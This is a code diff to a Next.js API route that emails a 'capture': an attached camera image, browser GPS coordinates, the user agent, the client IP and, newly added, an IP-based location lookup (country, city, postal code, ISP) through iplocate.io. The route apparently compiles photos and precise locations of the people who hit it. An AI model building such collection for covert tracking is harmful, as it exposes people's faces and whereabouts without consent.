@@ -11,17 +11,40 @@ export async function POST(req: Request) {
       );
     }
 
-    // ── Extract device info (User-Agent)
+    // ── Device info
     const userAgent =
       req.headers.get("user-agent") || "Unknown device";
 
-    // ── Extract IP address (Vercel-safe)
+    // ── Client IP (Vercel-safe)
     const forwardedFor =
       req.headers.get("x-forwarded-for") || "";
     const ip =
       forwardedFor.split(",")[0].trim() || "Unknown IP";
 
-    // ── Remove base64 header
+    // ── IPLocate lookup (IP-based location)
+    let ipLocationText = "IP location not available";
+
+    if (ip !== "Unknown IP") {
+      try {
+        const ipRes = await fetch(
+          `https://www.iplocate.io/api/lookup/${ip}?apikey=${process.env.IPLOCATE_API_KEY}`
+        );
+
+        const ipData = await ipRes.json();
+
+        ipLocationText = `
+Country: ${ipData.country || "N/A"}
+Region: ${ipData.subdivision || "N/A"}
+City: ${ipData.city || "N/A"}
+Postal Code: ${ipData.postal_code || "N/A"}
+ISP: ${ipData.org || "N/A"}
+        `.trim();
+      } catch (e) {
+        ipLocationText = "IPLocate lookup failed";
+      }
+    }
+
+    // ── Image (base64 → attachment)
     const base64Data = image.replace(
       /^data:image\/jpeg;base64,/,
       ""
@@ -44,15 +67,18 @@ export async function POST(req: Request) {
       text: `
 New capture received
 
-Location:
+GPS Location (Browser):
 Latitude: ${lat}
 Longitude: ${lon}
 
-Device Info:
-${userAgent}
-
 IP Address:
 ${ip}
+
+IP-Based Location (IPLocate):
+${ipLocationText}
+
+Device Info:
+${userAgent}
       `.trim(),
       attachments: [
         {
